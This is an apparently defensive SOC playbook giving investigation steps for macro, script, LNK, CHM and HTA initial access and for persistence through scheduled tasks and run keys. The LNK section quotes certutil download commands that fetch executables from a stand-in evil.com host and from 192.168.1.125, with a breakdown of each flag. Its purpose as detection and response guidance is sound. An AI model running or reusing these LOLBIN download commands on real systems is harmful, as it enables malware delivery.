# 🎯 SOC INCIDENT RESPONSE PLAYBOOK

## Complete Guide to Investigating Initial Access & Persistence Attacks

---

## TABLE OF CONTENTS

1. [Office Macro Attacks](#office-macro-attacks)
2. [Stand-Alone Script Attacks](#stand-alone-script-attacks)
3. [Malicious LNK Files](#malicious-lnk-files)
4. [CHM File Exploitation](#chm-file-exploitation)
5. [HTA File Attacks](#hta-file-attacks)
6. [Persistence Mechanisms](#persistence-mechanisms)

---

## OFFICE MACRO ATTACKS

### 🚨 ALERT RECEIVED

```
Rule: office_macros.yml
Event: EXCEL.EXE → powershell.exe
Severity: CRITICAL
```

### INVESTIGATION STEPS

#### Step 1: Immediate Containment (First 5 minutes)

```bash
# 1. Isolate affected system
# → Network isolation or EDR containment
# → Preserve all volatile data
# → Begin full memory capture if possible

# 2. Identify all affected systems
# → Check if macro from network share
# → Check if macro downloaded from email
# → Check if launched from USB/removable media

# 3. Gather initial evidence
# → Screenshot process tree (tasklist /m)
# → Export all running processes
# → Capture network connections (netstat -abno)
```

#### Step 2: Log Analysis (5-30 minutes)

```bash
# In your SIEM, search for:
# 1. Office macro parent-child relationship
# 2. Same user, same time, same computer
# 3. Previous email activity (Outlook logs)
# 4. File access logs (source file location)

# Queries to run:
search: office_macros.yml alert
  | stats count by User, Computer, CommandLine
  | search count > 1  # Multiple executions = spreading
```

#### Step 3: File Investigation (30-60 minutes)

```bash
# Find the source Office document
# Typical locations:
# - Downloads folder
# - Desktop
# - Temp folders
# - Network shares
# - Email attachments directory

# For each document found:
# 1. Calculate MD5/SHA256 hash
# 2. Check VirusTotal
# 3. Extract VBA macros
# 4. Analyze macro code
# 5. Check document metadata (Author, Create time)
```

#### Step 4: Threat Assessment

```bash
# Questions to answer:
# 1. What does the macro do?
#    - Download? Upload? Execute? Persistence?
# 2. When did it run?
#    - Once or multiple times?
# 3. What did PowerShell do?
#    - Network connections? File downloads?
# 4. Is there persistence?
#    - Scheduled task? Registry key? WMI?
```

#### Step 5: Scope Determination

```bash
# Search for signs of compromise:

# Same hash on other systems:
search: md5="[hash from original file]"

# Same macro command on other systems:
search: office_macros.yml alert
  | where CommandLine contains "[suspicious command]"

# Lateral movement from compromised system:
search: SourceIp="[infected IP]"
  | where EventType IN (FailedLogin, SuccessfulLogin)
```

#### Step 6: Containment & Eradication

```bash
# 1. Delete source document
# 2. Remove any malware/payloads downloaded
# 3. Remove persistence (scheduled tasks, registry)
# 4. Reset affected user password
# 5. Monitor for re-compromise
```

---

## STAND-ALONE SCRIPT ATTACKS

### ALERT RECEIVED (Initial Access)

```
Rule: scripts_user_folders.yml
Event: explorer.exe → wscript.exe → C:\Users\Downloads\malware.vbs
Severity: HIGH
```

### ALERT RECEIVED (Persistence)

```
Rule: scripts_system_folders.yml
Event: svchost.exe → wscript.exe → C:\ProgramData\downloader.js
Severity: CRITICAL
```

### Investigation Procedure

#### For User Folder Scripts (Initial Access):

```bash
# 1. Locate source file
#    - Check Downloads, Desktop, Documents, Temp
#    - Check email attachments folder
#    - Check if downloaded from web

# 2. Analyze script code
#    - Extract from .vbs or .js file
#    - Look for: cmd.exe, powershell, http://, net.exe
#    - Decode if obfuscated

# 3. Determine attacker capability
#    - What can the script do?
#    - Does it download more malware?
#    - Does it create persistence?
```

#### For System Folder Scripts (Persistence):

```bash
# 1. Immediate action
#    - Block C:\ProgramData execution
#    - Disable scheduled tasks
#    - Remove registry run keys

# 2. Find trigger mechanism
#    - Search for schtasks /Create
#    - Search for registry modifications
#    - Search for WMI subscriptions

# 3. Timeline analysis
#    - When was script placed?
#    - Who/what placed it?
#    - Has it executed since placement?
```

---

## MALICIOUS LNK FILES

### ALERT RECEIVED

```
Rule: lnk_file_execution.yml + malicious_lnk.yar
Event: explorer.exe → certutil.exe -urlcache http://evil.com/malware.exe
Severity: CRITICAL
```

### Investigation Procedure

#### Step 1: Locate LNK File

```bash
# Find the .lnk file on disk
# Common locations:
# - Desktop
# - Downloads
# - Documents
# - Temp folders
# - Email attachments temp folder
# - Recent files

# Use YARA to scan:
yara -r malicious_lnk.yar /path/to/search/
```

#### Step 2: Analyze LNK File

```bash
# Extract LNK metadata:
# - Target field (hidden command)
# - Arguments
# - Working directory
# - Icon file path

# Tools: LECmd.exe (LEtool), lnk_parser.py
```

#### Step 3: Decode Hidden Command

```bash
# Example hidden command from Lab #3:
certutil.exe -urlcache -split -f "http://192.168.1.125/second.exe" "C:\ProgramData\second.exe"

# Breakdown:
# - certutil.exe = legitimate tool (LOLBIN)
# - -urlcache -split = download mode
# - -f = force overwrite
# - http://192.168.1.125/second.exe = malware source
# - C:\ProgramData\second.exe = local path (writable)
```

#### Step 4: Network Investigation

```bash
# Check for network connections:
# - To: 192.168.1.125 or other C2
# - Port: 80, 443, or non-standard
# - When: During alert time
# - Volume: Single download or continuous?

# Check firewall/proxy logs
# Check EDR network alerts
# Check IDS/IPS logs
```

#### Step 5: Payload Analysis

```bash
# Locate downloaded file:
# - Look for "second.exe" in C:\ProgramData
# - Check file properties and signatures
# - Calculate MD5/SHA256
# - Check VirusTotal
# - Analyze with static/dynamic analysis
```

---

## CHM FILE EXPLOITATION

### ALERT RECEIVED

```
Rule: chm_file_execution.yml
Event: hh.exe → powershell.exe
Severity: HIGH
```

### Investigation Procedure

#### Step 1: Find Source CHM File

```bash
# Locate the .chm file:
# - Email attachments
# - Downloads
# - Desktop
# - Documents

# CHM files are uncommon - check user behavior
```

#### Step 2: Extract CHM Contents

```bash
# CHM is a compressed HTML format
# Extract with 7-Zip or CHMTool

# Look inside for:
# - HTML files
# - JavaScript files  
# - VBScript files
# - Embedded objects

# Check file timestamps (matching?)
```

#### Step 3: Analyze Embedded Scripts

```bash
# Extract .js and .vbs files
# Analyze for:
# - Network connections
# - File operations
# - Registry modifications
# - Process creation
```

#### Step 4: Determine Execution Method

```bash
# How does CHM auto-execute scripts?
# - .hhc files (index)
# - .hhk files (keywords)
# - .hhp files (project)
# - Embedded HTML with script

# Recent versions of Windows disabled auto-execute
# → Requires specific vulnerability or older OS
```

---

## HTA FILE ATTACKS

### ALERT RECEIVED

```
Rule: hta_file_execution.yml
Event: mshta.exe with suspicious command line
Severity: HIGH
```

### Investigation Procedure

#### Step 1: Locate HTA File

```bash
# Find the .hta file
# HTA files are HTML Application files
# Similar to web pages but can execute VBScript/JavaScript

# Typical locations:
# - Downloads
# - Desktop
# - Email attachments
```

#### Step 2: Extract HTA Source Code

```bash
# HTA files are text-based (like HTML)
# Open with text editor

# Look for:
# - <script> tags
# - VBScript or JavaScript code
# - Suspicious commands
# - Network connections
```

#### Step 3: Analyze Embedded Code

```bash
# Common HTA patterns:
# - CreateObject("WScript.Shell")
# - .Run() or .Exec() commands
# - XMLHttp for downloads
# - Registry modifications
```

---

## PERSISTENCE MECHANISMS

### SCHEDULED TASK CREATION

#### Alert Received:

```
Rule: scheduled_task_creation.yml
Event: powershell → schtasks.exe /Create
Severity: CRITICAL
```

#### Investigation Steps:

```bash
# 1. Query created tasks
# Get-ScheduledTask -TaskName * | Where {$_.Author -notmatch "Microsoft"}

# 2. Export task definition
# Export-ScheduledTask -TaskName "TaskName"

# 3. Analyze trigger and action
# - What triggers the task? (Startup? Time? Event?)
# - What does it execute?
# - With what privileges?
# - What's the command line?

# 4. Timeline
# - When was it created?
# - Who created it?
# - Has it executed? (Check last run time)
```

### REGISTRY RUN KEYS

#### Alert Received:

```
Rule: registry_run_keys.yml
Event: Registry modification to HKLM\Software\...\Run
Severity: CRITICAL
```

#### Investigation Steps:

```bash
# 1. Export registry key
# reg export "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"

# 2. For each suspicious value:
#    - Full path
#    - Target file existence
#    - File signatures
#    - File timestamps

# 3. Validate
#    - Does file exist?
#    - Is it signed?
#    - Check VirusTotal
#    - Analyze file behavior

# 4. Timeline
#    - When was entry created?
#    - Who/what created it?
#    - Has it executed? (Check Event Viewer)
```

---

## ESCALATION DECISION TREE

```
Alert Received
├─ Is it a False Positive?
│  └─ Check whitelist, check false positive documentation
│
├─ Single System Alert?
│  ├─ Isolate system
│  ├─ Preserve evidence
│  └─ Investigate (proceed through steps above)
│
├─ Multiple Systems Alert?
│  ├─ Check if same campaign
│  ├─ Estimate scope
│  ├─ Escalate to Incident Commander
│  └─ Implement containment
│
└─ Ransomware Indicators Present?
   ├─ Network isolation (immediately)
   ├─ Escalate to Incident Response Team
   ├─ Activate ransomware playbook
   └─ Notify leadership
```

---

## EVIDENCE COLLECTION CHECKLIST

For each incident, collect:

- [ ] Memory dump (if available)
- [ ] Disk image
- [ ] Sysmon event logs
- [ ] Windows event logs
- [ ] Email artifacts
- [ ] Source documents/files
- [ ] Network traffic (pcap)
- [ ] EDR telemetry
- [ ] Artifact hashes (MD5, SHA256)
- [ ] Timeline of events
- [ ] Screenshots of malware/alerts

---

## COMMUNICATION TEMPLATE

**Incident Report:**

```
Incident ID: [ID]
Severity: [CRITICAL/HIGH/MEDIUM/LOW]
Timeline: [Start time] - [End time]
Systems Affected: [Number and names]
Status: [Open/Contained/Closed]

Attack Pattern:
[Describe attack chain]

Impact Assessment:
- Initial Access: Yes/No
- Data Exfiltration: Yes/No
- Persistence Established: Yes/No
- Lateral Movement: Yes/No

Evidence:
- [List collected evidence]

Remediation:
- [Containment actions taken]
- [Eradication actions]
- [Recovery steps]

Prevention:
- [Future prevention measures]
```

---

**This playbook is a living document. Update with each incident learned.**
